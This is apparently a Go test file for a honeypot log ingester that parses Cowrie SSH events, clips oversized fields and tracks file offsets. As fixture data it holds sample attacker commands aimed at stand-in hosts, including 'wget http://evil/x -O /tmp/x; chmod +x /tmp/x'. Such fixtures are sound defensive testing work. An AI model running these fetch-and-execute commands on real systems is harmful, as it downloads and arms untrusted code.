package cowrie

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

func TestToEventCommand(t *testing.T) {
	rec := cowrieLine{
		EventID:    "cowrie.command.input",
		Timestamp:  "2026-05-21T12:00:00.000000Z",
		SrcIP:      "1.2.3.4",
		SrcPort:    4242,
		Username:   "root",
		Session:    "abc",
		Input:      "wget http://evil/p.sh",
		HASSH:      "hassh-123",
		SSHVersion: "SSH-2.0-libssh",
	}
	e, ok := toEvent(rec, `{"eventid":"cowrie.command.input"}`)
	if !ok {
		t.Fatalf("expected event to parse")
	}
	if e.Kind != "command" {
		t.Fatalf("expected command kind, got %s", e.Kind)
	}
	if e.HASSH != "hassh-123" {
		t.Fatalf("expected hassh, got %q", e.HASSH)
	}
	if e.Command == "" {
		t.Fatalf("expected command text")
	}
}

func TestToEventFileDownload(t *testing.T) {
	rec := cowrieLine{
		EventID:   "cowrie.session.file_download",
		Timestamp: "2026-05-21T12:00:00.000000Z",
		SrcIP:     "1.2.3.4",
		Session:   "s1",
		URL:       "http://evil.example/malware",
		Outfile:   "/var/lib/cowrie/downloads/abc123",
		SHA256:    "deadbeef",
	}
	e, ok := toEvent(rec, `{}`)
	if !ok {
		t.Fatal("expected parse")
	}
	if e.Kind != models.KindFileDown {
		t.Fatalf("kind=%s", e.Kind)
	}
	if e.Command != "http://evil.example/malware" {
		t.Fatalf("command=%q", e.Command)
	}
	if e.Filename != "/var/lib/cowrie/downloads/abc123" {
		t.Fatalf("filename=%q", e.Filename)
	}
}

func TestMapKindTunnel(t *testing.T) {
	k, ok := mapKind("cowrie.direct-tcpip.request")
	if !ok {
		t.Fatalf("expected tunnel kind")
	}
	if k != "tunnel" {
		t.Fatalf("expected tunnel, got %s", k)
	}
}

// TestMapKindConnectVsClientVersion guards against the regression where both
// cowrie.session.connect and cowrie.client.version mapped to KindConnect,
// double-counting every session as two connections. They must map to distinct
// kinds: the connection itself vs the client identity banner.
func TestMapKindConnectVsClientVersion(t *testing.T) {
	conn, ok := mapKind("cowrie.session.connect")
	if !ok || conn != models.KindConnect {
		t.Fatalf("cowrie.session.connect should map to %q, got %q (ok=%v)", models.KindConnect, conn, ok)
	}
	ver, ok := mapKind("cowrie.client.version")
	if !ok || ver != models.KindClientVersion {
		t.Fatalf("cowrie.client.version should map to %q, got %q (ok=%v)", models.KindClientVersion, ver, ok)
	}
	if conn == ver {
		t.Fatalf("connect and client.version must not share a kind (both %q)", conn)
	}
}

func TestParseReaderCountsSkippedLines(t *testing.T) {
	input := strings.Join([]string{
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1"}`,
		`{"eventid":`,
		`{"eventid":"cowrie.login.failed","timestamp":"not-a-time","src_ip":"1.2.3.4","username":"root","session":"s2"}`,
		`{"eventid":"cowrie.unknown","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4"}`,
	}, "\n")
	// Full-file semantics: process the final line even without a trailing
	// newline, so all 4 lines (1 parsed + 3 malformed) are accounted for.
	events, skipped, _, _, err := parseReader(strings.NewReader(input), true)
	if err != nil {
		t.Fatalf("parseReader: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected 1 parsed event, got %d", len(events))
	}
	if skipped != 3 {
		t.Fatalf("expected 3 skipped lines, got %d", skipped)
	}
}

// TestParseReaderSkipsOversizedLine guards HIGH-1: a single log line larger
// than the per-line cap must NOT abort the whole parse (which previously
// returned ErrTooLong and left the ingest offset un-advanced, permanently
// stalling cowrie ingest). The oversized line is skipped; lines after it are
// still parsed; consumed advances past the whole input so the offset moves on.
func TestParseReaderSkipsOversizedLine(t *testing.T) {
	huge := `{"eventid":"cowrie.command.input","src_ip":"1.2.3.4","session":"s1","input":"` + strings.Repeat("A", 3*1024*1024) + `"}`
	good := `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","username":"root","session":"s2"}`
	input := huge + "\n" + good + "\n"

	events, skipped, consumed, _, err := parseReader(strings.NewReader(input), false)
	if err != nil {
		t.Fatalf("parseReader must not error on an oversized line: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected the post-poison line to parse (1 event), got %d", len(events))
	}
	if skipped < 1 {
		t.Fatalf("expected the oversized line counted as skipped, got %d", skipped)
	}
	if consumed != int64(len(input)) {
		t.Fatalf("expected consumed=%d (advance past poison line), got %d", len(input), consumed)
	}
}

// TestParseReaderDoesNotConsumePartialTrailingLine guards MED-1: a final line
// without a trailing newline is incomplete (cowrie is mid-write). It must not
// be counted in `consumed`, so the offset stays before it and it is re-read
// once complete. Otherwise the event is silently lost.
func TestParseReaderDoesNotConsumePartialTrailingLine(t *testing.T) {
	complete := `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1"}`
	partial := `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3`
	input := complete + "\n" + partial // no trailing newline

	events, _, consumed, _, err := parseReader(strings.NewReader(input), false)
	if err != nil {
		t.Fatalf("parseReader: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected only the complete line to parse, got %d events", len(events))
	}
	if consumed != int64(len(complete)+1) {
		t.Fatalf("expected consumed to stop after the newline (%d), got %d", len(complete)+1, consumed)
	}
}

// TestToEventClipsOversizedFields guards MED-2: attacker-controlled fields are
// truncated so one crafted line can't bloat the DB / event batches. Truncation
// must be a deterministic byte-prefix (dedup identity includes command).
func TestToEventClipsOversizedFields(t *testing.T) {
	big := strings.Repeat("x", 200*1024)
	rec := cowrieLine{
		EventID:   "cowrie.command.input",
		Timestamp: "2026-05-21T12:00:00.000000Z",
		SrcIP:     "1.2.3.4",
		Session:   "s1",
		Username:  big,
		Input:     big,
	}
	e, ok := toEvent(rec, `{"eventid":"cowrie.command.input"}`)
	if !ok {
		t.Fatal("expected parse")
	}
	if len(e.Command) != maxFieldBytes {
		t.Fatalf("command not clipped to %d, got %d", maxFieldBytes, len(e.Command))
	}
	if len(e.Username) != maxFieldBytes {
		t.Fatalf("username not clipped to %d, got %d", maxFieldBytes, len(e.Username))
	}
	// Determinism: same input clips identically (dedup relies on this).
	e2, _ := toEvent(rec, `{"eventid":"cowrie.command.input"}`)
	if e.Command != e2.Command {
		t.Fatal("clip must be deterministic")
	}
}

// TestClipRuneBoundary ensures clip never splits a multi-byte rune.
func TestClipRuneBoundary(t *testing.T) {
	s := strings.Repeat("é", 100) // 2 bytes each
	out := clip(s, 5)             // 5 lands mid-rune; must back off to 4
	if !utf8.ValidString(out) {
		t.Fatalf("clip produced invalid UTF-8: %q", out)
	}
	if len(out) > 5 {
		t.Fatalf("clip exceeded max: %d", len(out))
	}
}

// TestIngestFileAppendRecoversAfterPoisonLine is the end-to-end guard for
// HIGH-1: an oversized line must not wedge the incremental offset. After the
// poison line, a subsequent appended good line must still be ingested.
func TestIngestFileAppendRecoversAfterPoisonLine(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	path := writeTempCowrieLog(t, `{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","session":"s1","input":"`+strings.Repeat("A", 3*1024*1024)+`"}`)
	if _, err := IngestFileAppend(st, path, nil); err != nil {
		t.Fatalf("append with poison line must not error: %v", err)
	}

	appendLine(t, path, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:01:00.000000Z","src_ip":"5.6.7.8","username":"admin","session":"s2"}`)
	if _, err := IngestFileAppend(st, path, nil); err != nil {
		t.Fatalf("second append: %v", err)
	}

	events, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected the post-poison good line to be ingested (1 event), got %d", len(events))
	}
}

func TestIngestFileReplaceKeepsJournalDataAndPersistsActorID(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	journalEvent := &models.Event{
		TS:     time.Date(2026, 5, 21, 10, 0, 0, 0, time.UTC),
		Source: models.SourceJournal,
		Kind:   models.KindInvalidUser,
		SrcIP:  "203.0.113.10",
		Raw:    "journal-line",
	}
	if err := st.InsertEvent(journalEvent); err != nil {
		t.Fatalf("insert journal event: %v", err)
	}
	if err := st.UpsertActor(&models.Actor{
		ID:         "journal:203.0.113.10",
		Source:     models.SourceJournal,
		PrimaryIP:  "203.0.113.10",
		FirstSeen:  journalEvent.TS,
		LastSeen:   journalEvent.TS,
		EventCount: 1,
	}); err != nil {
		t.Fatalf("insert journal actor: %v", err)
	}

	path := writeTempCowrieLog(t, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"username":"root","session":"s1","hassh":"h1"}`)
	if _, err := IngestFile(st, path, nil, true); err != nil {
		t.Fatalf("ingest replace: %v", err)
	}

	events, err := st.EventsBySource(models.SourceJournal)
	if err != nil {
		t.Fatalf("load journal events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected journal event to survive cowrie replace, got %d", len(events))
	}

	cowrieEvents, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load cowrie events: %v", err)
	}
	if len(cowrieEvents) != 1 {
		t.Fatalf("expected 1 cowrie event, got %d", len(cowrieEvents))
	}
	if cowrieEvents[0].ActorID == "" {
		t.Fatalf("expected cowrie event actor_id to be persisted")
	}
}

func TestIngestFileAppendDedupsByEventIdentity(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	first := writeTempCowrieLog(t, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"username":"root","session":"s1","hassh":"h1"}`)
	second := writeTempCowrieLog(t, `{ "eventid" : "cowrie.login.failed", "timestamp" : "2026-05-21T12:00:00.000000Z", "src_ip" : "1.2.3.4", "src_port" : 2222, "username" : "root", "session" : "s1", "hassh" : "h1" }`)

	if _, err := IngestFileAppend(st, first, nil); err != nil {
		t.Fatalf("first append: %v", err)
	}
	if _, err := IngestFileAppend(st, second, nil); err != nil {
		t.Fatalf("second append: %v", err)
	}
	events, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load cowrie events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected duplicate append to keep 1 event, got %d", len(events))
	}
}

// TestIngestFileAppendDetectsCopytruncate guards LOW-1: a file truncated in
// place and regrown past the old offset (logrotate copytruncate) keeps its
// inode, so the inode+size heuristic alone would seek past — and skip — the new
// content. The head-signature change must trigger a reset so the new events are
// ingested. We simulate copytruncate by truncating the file and rewriting it
// (os.WriteFile on the same path keeps the inode on Linux).
func TestIngestFileAppendDetectsCopytruncate(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	// First generation: enough lines that the saved offset is well past 0.
	dir := t.TempDir()
	path := filepath.Join(dir, "cowrie.json")
	var gen1 strings.Builder
	for i := 0; i < 20; i++ {
		gen1.WriteString(`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:0` +
			"0" + `.00000` + string(rune('0'+i%10)) + `Z","src_ip":"1.2.3.4","username":"root","session":"g1-` +
			string(rune('a'+i)) + `"}` + "\n")
	}
	if err := os.WriteFile(path, []byte(gen1.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := IngestFileAppend(st, path, nil); err != nil {
		t.Fatalf("gen1 append: %v", err)
	}

	// copytruncate: same path/inode, brand-new shorter content with a DIFFERENT
	// first line (so the head signature changes).
	gen2 := `{"eventid":"cowrie.login.failed","timestamp":"2026-05-22T09:00:00.000000Z","src_ip":"9.9.9.9","username":"admin","session":"g2-only"}` + "\n"
	if err := os.WriteFile(path, []byte(gen2), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := IngestFileAppend(st, path, nil); err != nil {
		t.Fatalf("gen2 append: %v", err)
	}

	// The gen2 event (9.9.9.9) must have been ingested, not skipped because the
	// saved offset pointed past the (now shorter) file's new content.
	events, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, e := range events {
		if e.SrcIP == "9.9.9.9" {
			found = true
		}
	}
	if !found {
		t.Fatal("copytruncate not detected: gen2 event (9.9.9.9) was skipped")
	}
}

func openTestStore(t *testing.T) *store.Store {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	return st
}

func writeTempCowrieLog(t *testing.T, line string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(line+"\n"), 0o644); err != nil {
		t.Fatalf("write cowrie log: %v", err)
	}
	return path
}

// appendLine appends one JSON line to an existing cowrie log file (same inode),
// simulating cowrie writing more events between live-ingest ticks.
func appendLine(t *testing.T, path, line string) {
	t.Helper()
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		t.Fatalf("open append: %v", err)
	}
	defer f.Close()
	if _, err := f.WriteString(line + "\n"); err != nil {
		t.Fatalf("append: %v", err)
	}
}

// actorSnapshot is a stable, comparable view of an actor's aggregate.
type actorSnapshot struct {
	ID          string
	EventCount  int
	UniqueUsers int
	PrimaryIP   string
	Intent      string
}

func snapshotActors(t *testing.T, st *store.Store) map[string]actorSnapshot {
	t.Helper()
	actors, err := st.ListActors(1000)
	if err != nil {
		t.Fatalf("list actors: %v", err)
	}
	out := map[string]actorSnapshot{}
	for _, a := range actors {
		out[a.ID] = actorSnapshot{
			ID:          a.ID,
			EventCount:  a.EventCount,
			UniqueUsers: a.UniqueUsers,
			PrimaryIP:   a.PrimaryIP,
			Intent:      a.Intent,
		}
	}
	return out
}

// TestIncrementalRebuildMatchesFullRebuild is the equivalence guard for the O1
// incremental cowrie actor rebuild: ingesting a log in several append ticks
// (incremental path) must produce the same actor aggregates as a single
// replace-mode ingest of the complete log (full rebuild path).
func TestIncrementalRebuildMatchesFullRebuild(t *testing.T) {
	lines := []string{
		`{"eventid":"cowrie.session.connect","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"session":"s1","hassh":"hashA"}`,
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:01.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1","hassh":"hashA"}`,
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:02.000000Z","src_ip":"1.2.3.4","username":"admin","session":"s1","hassh":"hashA"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:00:03.000000Z","src_ip":"1.2.3.4","input":"wget http://evil/x -O /tmp/x; chmod +x /tmp/x","session":"s1","hassh":"hashA"}`,
		// Second actor, different HASSH, different IP.
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:01:00.000000Z","src_ip":"5.6.7.8","username":"root","session":"s2","hassh":"hashB"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:01:01.000000Z","src_ip":"5.6.7.8","input":"uname -a","session":"s2","hassh":"hashB"}`,
		// More events for actor A in a later tick.
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:02:00.000000Z","src_ip":"1.2.3.4","username":"git","session":"s3","hassh":"hashA"}`,
	}

	// --- Incremental path: append a few lines at a time across ticks. ---
	incStore := openTestStore(t)
	defer incStore.Close()
	incPath := filepath.Join(t.TempDir(), "inc.json")
	if err := os.WriteFile(incPath, []byte(lines[0]+"\n"+lines[1]+"\n"), 0o644); err != nil {
		t.Fatalf("seed inc log: %v", err)
	}
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 1: %v", err)
	}
	appendLine(t, incPath, lines[2])
	appendLine(t, incPath, lines[3])
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 2: %v", err)
	}
	appendLine(t, incPath, lines[4])
	appendLine(t, incPath, lines[5])
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 3: %v", err)
	}
	appendLine(t, incPath, lines[6])
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 4: %v", err)
	}

	// --- Full rebuild path: replace-ingest the complete log at once. ---
	fullStore := openTestStore(t)
	defer fullStore.Close()
	fullPath := filepath.Join(t.TempDir(), "full.json")
	all := ""
	for _, l := range lines {
		all += l + "\n"
	}
	if err := os.WriteFile(fullPath, []byte(all), 0o644); err != nil {
		t.Fatalf("write full log: %v", err)
	}
	if _, err := IngestFile(fullStore, fullPath, nil, true); err != nil {
		t.Fatalf("full ingest: %v", err)
	}

	inc := snapshotActors(t, incStore)
	full := snapshotActors(t, fullStore)
	if len(inc) != len(full) {
		t.Fatalf("actor count mismatch: incremental=%d full=%d\ninc=%+v\nfull=%+v", len(inc), len(full), inc, full)
	}
	for id, fa := range full {
		ia, ok := inc[id]
		if !ok {
			t.Errorf("actor %s present in full rebuild but missing from incremental", id)
			continue
		}
		if ia != fa {
			t.Errorf("actor %s aggregate mismatch:\n incremental=%+v\n full=%+v", id, ia, fa)
		}
	}
}

// TestParseReaderOversizedUnterminatedTailNotConsumed: a giant final line with
// no newline is an incomplete write — it must be neither parsed nor consumed,
// so the offset stays put until cowrie finishes the line.
func TestParseReaderOversizedUnterminatedTailNotConsumed(t *testing.T) {
	good := `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1"}`
	hugePartial := `{"eventid":"x","input":"` + strings.Repeat("Z", 3*1024*1024) // no closing/newline
	input := good + "\n" + hugePartial
	events, _, consumed, _, err := parseReader(strings.NewReader(input), false)
	if err != nil {
		t.Fatalf("parseReader: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected only the good line, got %d", len(events))
	}
	if consumed != int64(len(good)+1) {
		t.Fatalf("expected consumed=%d (offset before the partial poison tail), got %d", len(good)+1, consumed)
	}
}
